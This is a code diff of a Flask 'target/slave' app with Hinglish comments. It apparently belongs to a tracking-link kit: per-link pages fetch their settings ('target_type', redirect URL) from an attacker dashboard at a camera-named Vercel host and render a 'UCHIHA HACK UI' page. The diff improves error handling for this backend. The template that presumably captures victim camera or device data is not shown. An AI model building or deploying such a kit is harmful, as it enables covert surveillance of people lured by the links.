@@ -1,27 +1,36 @@
 # APP 2 (TARGET/SLAVE APP) - by:@ROMEO_UCHIHA
-from flask import Flask, render_template_string, jsonify
+from flask import Flask, render_template_string
 import requests
 
 app = Flask(__name__)
 
-# ---> YAHAN APNI MAIN DASHBOARD WALI VERCEL URL DALO <---
-MAIN_APP_URL = "https://app1-dashboard.vercel.app" 
+# ---> ⚠️ YAHAN APNI MAIN DASHBOARD WALI VERCEL URL DALO ⚠️ <---
+# Agar dashboard camera.vercel.app par hai tu wo dalna
+MAIN_APP_URL = "https://rm-camera.vercel.app" 
 
 @app.route("/")
 def home():
-    return "System Online."
+    return "Target System Online."
 
 @app.route("/t/<link_id>")
 def target_page(link_id):
     # Fetch configuration from Main App
     try:
-        config = requests.get(f"{MAIN_APP_URL}/api/config/{link_id}").json()
-        if "error" in config: return "Link Expired or Not Found!"
-    except:
-        return "System Error."
+        api_url = f"{MAIN_APP_URL}/api/config/{link_id}"
+        req = requests.get(api_url, timeout=10)
+        
+        if req.status_code != 200:
+            return f"API Connection Error: Status Code {req.status_code} from Main App."
+            
+        config = req.json()
+        if "error" in config: 
+            return "Link Expired or Not Found in Database!"
+            
+    except Exception as e:
+        return f"System Error (Connection to Dashboard Failed): {str(e)}"
 
-    target_type = config["target_type"]
-    r_url = config["redirect_url"]
+    target_type = config.get("target_type", "both")
+    r_url = config.get("redirect_url", "https://google.com")
 
     # --- UCHIHA HACK UI ---
     return render_template_string('''
@@ -153,5 +162,4 @@ def target_page(link_id):
     ''', t_type=target_type, r_url=r_url, l_id=link_id, main_url=MAIN_APP_URL)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, threaded=True)
-
+    app.run(host="0.0.0.0", port=5000)
